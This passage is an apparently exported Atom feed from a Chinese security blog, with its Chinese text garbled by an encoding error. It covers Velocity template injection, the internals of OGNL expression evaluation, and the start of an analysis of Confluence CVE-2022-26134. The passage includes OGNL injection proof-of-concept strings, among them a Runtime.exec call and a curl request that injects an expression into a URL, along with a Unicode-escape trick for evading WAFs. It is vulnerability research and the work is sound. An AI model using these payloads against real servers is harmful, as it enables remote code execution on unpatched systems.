ç³»åˆ—æ¼æ´åˆ†æçš„åŸºç¡€ã€‚ç²¾åŠ›æœ‰é™ï¼Œæ²¡æœ‰å†åˆ†æFreeMarkerï¼Œåº”è¯¥å’ŒVelocity ç±»ä¼¼ï¼Œä»¥åé‡åˆ°ç›¸å…³çš„åœ¨åšåˆ†æå§ã€‚</p><!-- ç›®å‰çŸ¥è¯†é¢æœ‰é™ï¼Œé‡åˆ°çš„Velocity æ¨¡æ¿æ³¨å…¥æ¼æ´ï¼ŒåŸºæœ¬ä¸Šæ˜¯å¯ä»¥è‡ªå®šä¹‰æ¨¡æ¿å†…å®¹ä»è€Œå¯¼è‡´çš„RCEã€‚å”¯ä¸€é‡åˆ°Confluence CVE-2021-26084è¿™ä¸ªæ˜¯å› ä¸ºvm å†™çš„æœ‰é—®é¢˜å¯¼è‡´çš„Ognlæ³¨å…¥ã€‚1. é‚£ä¹ˆå¦‚ä½•æ‰èƒ½å†™å‡ºæœ‰é—®é¢˜çš„vmå‘¢ï¼Ÿ2. å…³äºæ¨¡æ¿å¼•æ“çš„è‡ªåŠ¨åŒ–æ¼æ´å‘ç°ç›®å‰è¿˜æ²¡æœ‰çœ‹åˆ°å¥½çš„å·¥å…·ï¼Œåƒcodeql/semgrep éƒ½ä¸æ”¯æŒï¼Œæœ‰æ²¡æœ‰å¥½çš„è§£å†³æ–¹æ³•ï¼Ÿ--><h2 id="0x05-å‚è€ƒ"><a href="#0x05-å‚è€ƒ" class="headerlink" title="0x05 å‚è€ƒ"></a>0x05 å‚è€ƒ</h2><ul><li>[1] <a href="https://www.cnblogs.com/nice0e3/p/16218857.html#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5">Javaå®‰å…¨ä¹‹velocity æ¨¡æ¿æ³¨å…¥ï¼ˆby:nice_0e3ï¼‰</a></li><li>[2] <a href="https://xz.aliyun.com/t/10603">CVE-2021-22017+22005æ¨¡æ¿æ³¨å…¥åˆ†æ (by:lz520)</a></li><li>[3] <a href="https://paper.seebug.org/1107/">Apache Solr Velocity æ¨¡æ¿æ³¨å…¥æ¼æ´æ·±åº¦åˆ†æ</a></li><li>[4] <a href="http://ifeve.com/apache-velocity-dev/">ã€ŠApache Velocityç”¨æˆ·æŒ‡å—ã€‹å®˜æ–¹æ–‡æ¡£è¯‘</a></li><li>[5] <a href="https://velocity.apache.org/engine/devel/user-guide.html">Apache Velocity Docs</a></li><li>[6] <a href="https://struts.apache.org/tag-developers/index">ã€ŠStruts/Tag Developers Guideã€‹</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;æ¨¡æ¿å¼•æ“æ³¨å…¥ä¹Ÿç®—æ˜¯é€šç”¨çš„æ¼æ´ç±»å‹äº†ï¼Œä¸è®ºæ˜¯python/javaï¼Œå‡ºç°è¿‡çš„cveä¾‹å­ä¹Ÿä¸å°‘ã€‚JSP/FreeMarker/Velocity ä½œä¸ºStruts2 çš„é»˜è®¤æ¨¡æ¿å¼•æ“ï¼Œåˆ†æåˆ†æå…¶å®ç°åŸç†ï¼Œä¸ºä»¥åçš„æ¼æ´åˆ†æä½œé“ºå«ã€‚&lt;/p&gt;
&lt;h2 id=&quot;0x01-èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#0x01-èƒŒæ™¯çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;0x01 èƒŒæ™¯çŸ¥è¯†&quot;&gt;&lt;/a&gt;0x01 èƒŒæ™¯çŸ¥è¯†&lt;/h2&gt;&lt;h3 id=&quot;Struts2-Tag&quot;&gt;&lt;a href=&quot;#Struts2-Tag&quot; class=&quot;headerlink&quot; title=&quot;Struts2 Tag&quot;&gt;&lt;/a&gt;Struts2 Tag&lt;/h3&gt;&lt;p&gt;Tagæ˜¯struts æ¨¡æ¿å…ƒç´ çš„åŸºç¡€å•ä½ã€‚å»ºè®®å…ˆé˜…è¯»å‚è€ƒã€6ã€‘ä¸­ã€ŠTag Developers Guideã€‹ã€‚&lt;/p&gt;
&lt;p&gt;Tag æœ‰ä»¥ä¸‹å‡ ç±»&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;é€šç”¨tag&lt;ul&gt;
&lt;li&gt;æ§åˆ¶æµ tagï¼Œ ä¾‹å¦‚ ifã€else&lt;/li&gt;
&lt;li&gt;æ•°æ®tagï¼Œ ä¾‹å¦‚includeã€setã€url&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;UI tagï¼Œä¾‹å¦‚ fromã€textã€div&lt;ul&gt;
&lt;li&gt;Form tagï¼Œä¾‹å¦‚ checkboxã€checkboxã€head&lt;/li&gt;
&lt;li&gt;éForm tagï¼Œä¾‹å¦‚actonerrorã€actionmessage&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ¨¡æ¿çš„é€»è¾‘æ˜¯å¦‚ä½•å®ç°çš„å‘¢ï¼Ÿ&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Struts2" scheme="http://m0d9.me/tags/Struts2/"/>
    
    <category term="Velocity" scheme="http://m0d9.me/tags/Velocity/"/>
    
  </entry>
  
  <entry>
    <title>Struts2ç³»åˆ—ä¸€ï¼šOGNL è¡¨è¾¾å¼</title>
    <link href="http://m0d9.me/2022/07/11/Struts2%E7%B3%BB%E5%88%97%E4%B8%80%EF%BC%9AOGNL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <id>http://m0d9.me/2022/07/11/Struts2%E7%B3%BB%E5%88%97%E4%B8%80%EF%BC%9AOGNL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F/</id>
    <published>2022-07-11T08:27:00.000Z</published>
    <updated>2022-09-13T14:00:42.759Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘åœ¨å¤ç›˜confluence CVE-2022-26134 è¿™ä¸ªæ¼æ´ï¼Œå‘ç°æ ¹æœ¬åŸå› è¿˜æ˜¯Struts2 æ¶æ„çš„é—®é¢˜ï¼Œè¿™å—çš„çŸ¥è¯†ç‚¹æŒºå¤šï¼Œä¸æ˜¯ä¸€ç¯‡æ–‡ç« èƒ½è§£é‡Šæ¸…æ¥šçš„ï¼Œå› æ­¤å‡†å¤‡æä¸ªç³»åˆ—ï¼Œç†ç†Struts2 æ¶æ„ç›¸å…³çš„æ¼æ´åŠåŸç†ã€‚</p><ul><li>Ognl</li><li>velocity</li><li>Struts2</li><li>Confluence</li></ul><h2 id="Ox01-åŸºç¡€çŸ¥è¯†"><a href="#Ox01-åŸºç¡€çŸ¥è¯†" class="headerlink" title="Ox01 åŸºç¡€çŸ¥è¯†"></a>Ox01 åŸºç¡€çŸ¥è¯†</h2><p>å‚è€ƒã€1ã€‘ä¸­R17a å·²ç»æœ‰æ•´ç†äº†ç›¸å…³çš„OGNLç›¸å…³åŸºç¡€çŸ¥è¯†ï¼Œè¿™é‡Œä¸åšæ·±å…¥ä»‹ç»ï¼Œç®€å•ç½—åˆ—ä¸‹çŸ¥è¯†ç‚¹ã€‚</p><ol><li>expression è¡¨è¾¾å¼ã€ç›¸å…³è¯­æ³•    </li><li>context ä¸Šä¸‹æ–‡</li><li>root å¯¹è±¡</li></ol><h2 id="0x02-åŸç†"><a href="#0x02-åŸç†" class="headerlink" title="0x02 åŸç†"></a>0x02 åŸç†</h2><h3 id="2-1-ç”ŸæˆASTæ ‘"><a href="#2-1-ç”ŸæˆASTæ ‘" class="headerlink" title="2.1 ç”ŸæˆASTæ ‘"></a>2.1 ç”ŸæˆASTæ ‘</h3><p>ä»¥ä»¥ä¸‹pocä¸ºä¾‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ognl.getValue(<span class="string">&quot;@java.lang.Runtime@getRuntime().exec(&#x27;open -a Calculator&#x27;)&quot;</span>, context, context.getRoot());</span><br></pre></td></tr></table></figure><a id="more"></a><p>Ognlçš„å¤„ç†é€»è¾‘å¤§è‡´å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OgnlParser parser = <span class="keyword">new</span> OgnlParser(<span class="keyword">new</span> StringReader(expression));</span><br></pre></td></tr></table></figure><p>R17aå¸ˆå‚…çš„å›¾ç”»çš„å¾ˆå¥½ï¼Œç”Ÿæˆçš„ASTæ ‘å¦‚ä¸‹ï¼š<br><img src="/images/pasted-225.png" alt="upload successful"><br><img src="/images/pasted-224.png" alt="upload successful"></p><h3 id="2-2-æ‰§è¡ŒAST"><a href="#2-2-æ‰§è¡ŒAST" class="headerlink" title="2.2 æ‰§è¡ŒAST"></a>2.2 æ‰§è¡ŒAST</h3><p>SimpleNodeæ˜¯ASTèŠ‚ç‚¹çš„å®ç°ï¼ŒOgnl.getValueæœ€ç»ˆä¼šè°ƒç”¨SimpleNode.getValueBody/getValue æ¥å£ï¼Œé€’å½’å®ç°æ•´ä¸ªASTæ ‘çš„æ‰§è¡Œã€‚</p><p>ASTæ•°åŸºæœ¬ç»“æ„æœ‰å¾ˆå¤šï¼Œåœ¨ognl.Ognlè·¯å¾„ä¸‹ï¼Œå…¶ä¸­å‡ ä¸ªæœ¬å®ä¾‹æ¶‰åŠåˆ°çš„</p><ul><li>ASTChain</li><li>ASTConst</li><li>ASTMethod</li><li>ASTStaticMethod</li></ul><p><img src="/images/pasted-226.png" alt="upload successful"><br>æ¯”è¾ƒé‡è¦çš„æ˜¯SimpleNode.getValueBody æ¥å£çš„å®ç°ã€‚</p><p>è¯¦ç»†çš„ä»£ç è·Ÿè¸ªæµç¨‹R17aå¸ˆå‚…æ–‡ç« é‡Œä¹Ÿæœ‰ï¼Œä¸ç»†è®²ï¼Œå¤§è‡´å¦‚ä¸‹ã€‚</p><ol><li><p>ASTChain.getValueBody ä¼šæ­£åºéå†å­èŠ‚ç‚¹çš„getValue æ–¹æ³•ï¼Œå‰ä¸€ä¸ªç»“æœä¼šä½œä¸ºåä¸€ä¸ªçš„å‚æ•°</p><p> <code>result = this.children[i].getValue(context, result);</code></p></li><li><p>ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ä¸ºASTStaticMethodï¼Œå…¶getValueBody é€šè¿‡OgnlRuntime.callStaticMethod ç”ŸæˆRuntimeå®ä¾‹ï¼Œä½œä¸ºresult</p><p> <code>Object var10 = OgnlRuntime.callStaticMethod(context, this.className, this.methodName, args); </code></p></li><li><p>ç¬¬äºŒä¸ªèŠ‚ç‚¹ASTMethodï¼Œå…¶getValueBody é¦–å…ˆä¼šæ ¹æ®å®ƒçš„å­èŠ‚ç‚¹ç»„å»ºargsï¼Œç„¶åè°ƒç”¨OgnlRuntime.callMethodï¼Œè°ƒç”¨Runtime.exec(args)</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> icount = args.length; i &lt; icount; ++i) &#123;</span><br><span class="line">    args[i] = <span class="keyword">this</span>.children[i].getValue(context, root);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å…¶ä¸­sourceå‚æ•°ä¸ºä¸Šä¸€æ­¥çš„result</span></span><br><span class="line"><span class="comment">// this.methodNameä¸ºexec</span></span><br><span class="line">Object result = OgnlRuntime.callMethod(context, source, <span class="keyword">this</span>.methodName, (String)<span class="keyword">null</span>, args);</span><br></pre></td></tr></table></figure></li></ol><p>è¿™ä¸ªcaseçš„è¯¦ç»†è°ƒç”¨æ ˆå¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">invokeMethod:500, OgnlRuntime (ognl)</span><br><span class="line">callAppropriateMethod:794, OgnlRuntime (ognl)</span><br><span class="line">callMethod:61, ObjectMethodAccessor (ognl)</span><br><span class="line">callMethod:828, OgnlRuntime (ognl)</span><br><span class="line">getValueBody:75, ASTMethod (ognl)</span><br><span class="line">evaluateGetValueBody:171, SimpleNode (ognl) [2]</span><br><span class="line">getValue:213, SimpleNode (ognl)</span><br><span class="line">getValueBody:109, ASTChain (ognl)</span><br><span class="line">evaluateGetValueBody:171, SimpleNode (ognl) [1]</span><br><span class="line">getValue:213, SimpleNode (ognl)</span><br><span class="line">getValue:333, Ognl (ognl)</span><br><span class="line">getValue:378, Ognl (ognl)</span><br><span class="line">getValue:357, Ognl (ognl)</span><br></pre></td></tr></table></figure><h2 id="0x03-Unicodeç¼–ç "><a href="#0x03-Unicodeç¼–ç " class="headerlink" title="0x03 Unicodeç¼–ç "></a>0x03 Unicodeç¼–ç </h2><p>Confluence CVE-2021-26084 çš„POCä¸­æœ‰ç”¨åˆ°Unicodeç¼–ç ï¼Œä¸€äº›å¸ˆå‚…çš„æ–‡ç« é‡Œä¹Ÿæœ‰æåˆ°è¿‡è¿™ä¸ªç‰¹æ€§ï¼Œä¾‹å¦‚å‚è€ƒã€2ã€‘Lotso å¸ˆå‚…çš„æ–‡ç« ã€‚ä½†æ˜¯æ²¡çœ‹åˆ°å…³äºè¿™å—çš„ä»£ç è·Ÿè¸ªï¼Œè¿™é‡Œä¸°å¯Œä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">tUnicode</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    OgnlContext context = <span class="keyword">new</span> OgnlContext();</span><br><span class="line">    String s = <span class="string">&quot;\\u00271&#x27;+#&#123;233*233&#125;&quot;</span>;</span><br><span class="line">    System.out.println(s);</span><br><span class="line">    System.out.println(Ognl.getValue(s, context));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ”¯æŒUnicode çš„é€»è¾‘åœ¨ognl.JavaCharStream ä¸­ï¼Œå¤§è‡´é€»è¾‘å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä»char bufferä¸­è¯»ä¸€ä¸ªcharï¼Œç›®çš„ä¸ºäº†å…¼å®¹unicode</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">readChar</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">...</span><br><span class="line">   <span class="keyword">if</span> ((<span class="keyword">this</span>.buffer[<span class="keyword">this</span>.bufpos] = c = <span class="keyword">this</span>.ReadByte()) != <span class="string">&#x27;\\&#x27;</span>) &#123;</span><br><span class="line">               <span class="keyword">this</span>.UpdateLineColumn(c);</span><br><span class="line">               <span class="keyword">return</span> c;</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           ...</span><br><span class="line">           <span class="comment">// æ³¨æ„è¿™é‡Œçš„whileï¼Œæ”¯æŒæ— é™å¡«å……uï¼Œå¯ä»¥ç”¨æ¥ç»•è¿‡wafç¼–ç </span></span><br><span class="line">                           <span class="keyword">while</span>((c = <span class="keyword">this</span>.ReadByte()) == <span class="string">&#x27;u&#x27;</span>) &#123;</span><br><span class="line">                               ++<span class="keyword">this</span>.column;</span><br><span class="line">                           &#125;</span><br><span class="line">             <span class="comment">// å–åé¢çš„4ä¸ªå­—èŠ‚ï¼Œç»„æˆunicode char</span></span><br><span class="line">                           <span class="keyword">this</span>.buffer[<span class="keyword">this</span>.bufpos] = c = (<span class="keyword">char</span>)(hexval(c) &lt;&lt; <span class="number">12</span> | hexval(<span class="keyword">this</span>.ReadByte()) &lt;&lt; <span class="number">8</span> | hexval(<span class="keyword">this</span>.ReadByte()) &lt;&lt; <span class="number">4</span> | hexval(<span class="keyword">this</span>.ReadByte()));</span><br></pre></td></tr></table></figure><h2 id="0x04-æ€»ç»“ä¸æ€è€ƒ"><a href="#0x04-æ€»ç»“ä¸æ€è€ƒ" class="headerlink" title="0x04 æ€»ç»“ä¸æ€è€ƒ"></a>0x04 æ€»ç»“ä¸æ€è€ƒ</h2><p>æœ¬æ–‡ç®€è¦è·Ÿè¸ªäº†Ognlè¡¨è¾¾å¼çš„åŸç†ï¼Œä¸»è¦æ¶‰åŠASTè¯­æ³•æ ‘çš„ç”Ÿæˆä¸æ‰§è¡Œï¼ŒåŸºæœ¬éƒ½æ˜¯è€çŸ¥è¯†ï¼Œå†…å®¹é‡ä¸å¤šã€‚å”¯ä¸€çš„æ–°å¢ç‚¹æ˜¯unicodeçš„ç¼–ç é‡Œé¢è¿˜æœ‰å¯ä»¥ç©çš„ä¸€äº›ä¸œè¥¿ã€‚</p><p>æ€è€ƒï¼š</p><ol><li>struts åç»­æ¡†æ¶å¼•å…¥äº†SecurityMemberAccessï¼Œè¿™ä¸ªæœ‰ä¸€äº›ç»•è¿‡å§¿åŠ¿ï¼Œä½†æ˜¯åŸºæœ¬éƒ½æ˜¯åå°„æ§åˆ¶å¼€å…³ï¼Œå¯ä»¥ä»Ognlè¿™è¾¹å‡ºå‘å¯»æ‰¾çªç ´å—ï¼Ÿ</li></ol><h2 id="0x05-å‚è€ƒ"><a href="#0x05-å‚è€ƒ" class="headerlink" title="0x05 å‚è€ƒ"></a>0x05 å‚è€ƒ</h2><ul><li>[1] <a href="https://xz.aliyun.com/t/10482">ä¸€æ–‡è¯»æ‡‚OGNLæ¼æ´ (by:R17a)</a></li><li>[2] <a href="https://www.anquanke.com/post/id/253398">CVE-2021-26084ï¼šConfluence Webwork Ognlè¡¨è¾¾å¼æ³¨å…¥æ¼æ´åˆ†æ (by:Lotso)</a></li><li>[3] <a href="https://paper.seebug.org/794/#0x03-ognl">æµ…æ OGNL çš„æ”»é˜²å² (by:Lucifaer)</a></li><li>[4] <a href="http://j0k3r.top/2020/08/19/java-ognl/#0x01-OGNL-Object-Graph-Navigation-Library">Java OGNL è¡¨è¾¾å¼æ³¨å…¥ (by:J0k3r)</a></li><li>[5] <a href="https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">OGNLè¡¨è¾¾å¼æ³¨å…¥æ¼æ´æ€»ç»“ (by:Mi1k7ea)</a></li><li>[7] <a href="https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=OGNL">OGNL CVEs</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ€è¿‘åœ¨å¤ç›˜confluence CVE-2022-26134 è¿™ä¸ªæ¼æ´ï¼Œå‘ç°æ ¹æœ¬åŸå› è¿˜æ˜¯Struts2 æ¶æ„çš„é—®é¢˜ï¼Œè¿™å—çš„çŸ¥è¯†ç‚¹æŒºå¤šï¼Œä¸æ˜¯ä¸€ç¯‡æ–‡ç« èƒ½è§£é‡Šæ¸…æ¥šçš„ï¼Œå› æ­¤å‡†å¤‡æä¸ªç³»åˆ—ï¼Œç†ç†Struts2 æ¶æ„ç›¸å…³çš„æ¼æ´åŠåŸç†ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Ognl&lt;/li&gt;
&lt;li&gt;velocity&lt;/li&gt;
&lt;li&gt;Struts2&lt;/li&gt;
&lt;li&gt;Confluence&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;Ox01-åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#Ox01-åŸºç¡€çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;Ox01 åŸºç¡€çŸ¥è¯†&quot;&gt;&lt;/a&gt;Ox01 åŸºç¡€çŸ¥è¯†&lt;/h2&gt;&lt;p&gt;å‚è€ƒã€1ã€‘ä¸­R17a å·²ç»æœ‰æ•´ç†äº†ç›¸å…³çš„OGNLç›¸å…³åŸºç¡€çŸ¥è¯†ï¼Œè¿™é‡Œä¸åšæ·±å…¥ä»‹ç»ï¼Œç®€å•ç½—åˆ—ä¸‹çŸ¥è¯†ç‚¹ã€‚&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;expression è¡¨è¾¾å¼ã€ç›¸å…³è¯­æ³•    &lt;/li&gt;
&lt;li&gt;context ä¸Šä¸‹æ–‡&lt;/li&gt;
&lt;li&gt;root å¯¹è±¡&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;0x02-åŸç†&quot;&gt;&lt;a href=&quot;#0x02-åŸç†&quot; class=&quot;headerlink&quot; title=&quot;0x02 åŸç†&quot;&gt;&lt;/a&gt;0x02 åŸç†&lt;/h2&gt;&lt;h3 id=&quot;2-1-ç”ŸæˆASTæ ‘&quot;&gt;&lt;a href=&quot;#2-1-ç”ŸæˆASTæ ‘&quot; class=&quot;headerlink&quot; title=&quot;2.1 ç”ŸæˆASTæ ‘&quot;&gt;&lt;/a&gt;2.1 ç”ŸæˆASTæ ‘&lt;/h3&gt;&lt;p&gt;ä»¥ä»¥ä¸‹pocä¸ºä¾‹&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Ognl.getValue(&lt;span class=&quot;string&quot;&gt;&amp;quot;@java.lang.Runtime@getRuntime().exec(&amp;#x27;open -a Calculator&amp;#x27;)&amp;quot;&lt;/span&gt;, context, context.getRoot());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="OGNL" scheme="http://m0d9.me/tags/OGNL/"/>
    
    <category term="Struts2" scheme="http://m0d9.me/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>Confluence CVE-2022-26134 OGNL åˆ†æ</title>
    <link href="http://m0d9.me/2022/06/10/Confluence-CVE-2022-26134-OGNL-%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2022/06/10/Confluence-CVE-2022-26134-OGNL-%E5%88%86%E6%9E%90/</id>
    <published>2022-06-10T06:20:00.000Z</published>
    <updated>2022-09-13T14:00:43.202Z</updated>
    
    <content type="html"><![CDATA[<!-- æ—¥æ‹±ä¸€å’ï¼ŒåŠŸä¸å”æã€‚--><p>å‘ç°åŠå¹´æ²¡å†™æ–‡ç« äº†ã€‚ã€‚ã€‚</p><h2 id="0x01-ç¯å¢ƒæ­å»º"><a href="#0x01-ç¯å¢ƒæ­å»º" class="headerlink" title="0x01 ç¯å¢ƒæ­å»º"></a>0x01 ç¯å¢ƒæ­å»º</h2><p>PğŸ®çš„Vulhub æœ‰é•œåƒäº†ï¼Œä¸è¿‡è°ƒè¯•æ¥å£æ²¡æœ‰å¼€å‡ºæ¥ï¼Œè¿™é‡Œç¨å¾®è¡¥å……ä¸‹ã€‚</p><p>åœ¨vulhub/confluence/CVE2022-26134 ç›®å½•ä¸‹</p><ol><li>æ–°å»ºDockerfile</li></ol><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> vulhub/confluence:<span class="number">7.13</span>.<span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> sed <span class="string">&quot;106 iCATALINA_OPTS=\&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 \$\&#123;CATALINA_OPTS\&#125;\&quot;&quot;</span> -i /opt/atlassian/confluence/bin/setenv.sh</span></span><br></pre></td></tr></table></figure><ol start="2"><li>æ›´æ–°docker-compose.yml</li></ol><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">build:</span> <span class="string">.</span></span><br><span class="line"><span class="comment"># image: vulhub/confluence:7.13.6</span></span><br><span class="line"><span class="attr">ports:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;8090:8090&quot;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">&quot;5005:5005&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="0x02-æ¼æ´åˆ†æ"><a href="#0x02-æ¼æ´åˆ†æ" class="headerlink" title="0x02 æ¼æ´åˆ†æ"></a>0x02 æ¼æ´åˆ†æ</h2><p>Y4er å¸ˆå‚…å…³äºæ¼æ´çš„æ€»ç»“å¾—æŒºå¥½çš„ï¼Œæ¼æ´å¤ç°è¿™å—å·²ç»æ²¡ä»€ä¹ˆå¥½è®²çš„äº†ã€‚</p><ul><li>æ¼æ´çš„è°ƒç”¨æ ˆ</li><li>é»‘ç™½åå•çš„ç»•è¿‡</li></ul><p>POC: <code>curl -v &quot;http://192.168.1.112:8090/%24%7B1+1%7D/&quot;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@com.atlassian.confluence.util.GeneralUtil@setCookie(&quot;key&quot;,&quot;value&quot;)&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-219.png" alt="upload successful"></p><p>æœ€ç»ˆçš„è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">findValue:129, OgnlValueStack (com.opensymphony.xwork.util)</span><br><span class="line">translateVariables:39, TextParseUtil (com.opensymphony.xwork.util)</span><br><span class="line">execute:95, ActionChainResult (com.opensymphony.xwork)</span><br><span class="line">executeResult:263, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">invoke:187, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:21, FlashScopeInterceptor (com.atlassian.confluence.xwork)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [3]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:27, LastModifiedInterceptor (com.atlassian.confluence.core.actions)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:44, ConfluenceAutowireInterceptor (com.atlassian.confluence.core)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [2]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">invokeAndHandleExceptions:61, TransactionalInvocation (com.atlassian.xwork.interceptors)</span><br><span class="line">invokeInTransaction:51, TransactionalInvocation (com.atlassian.xwork.interceptors)</span><br><span class="line">intercept:50, XWorkTransactionInterceptor (com.atlassian.xwork.interceptors)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:61, SetupIncompleteInterceptor (com.atlassian.confluence.xwork)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:26, SecurityHeadersInterceptor (com.atlassian.confluence.security.interceptors)</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">intercept:35, AroundInterceptor (com.opensymphony.xwork.interceptor) [1]</span><br><span class="line">invoke:165, DefaultActionInvocation (com.opensymphony.xwork)</span><br><span class="line">execute:115, DefaultActionProxy (com.opensymphony.xwork)</span><br><span class="line">serviceAction:56, ConfluenceServletDispatcher 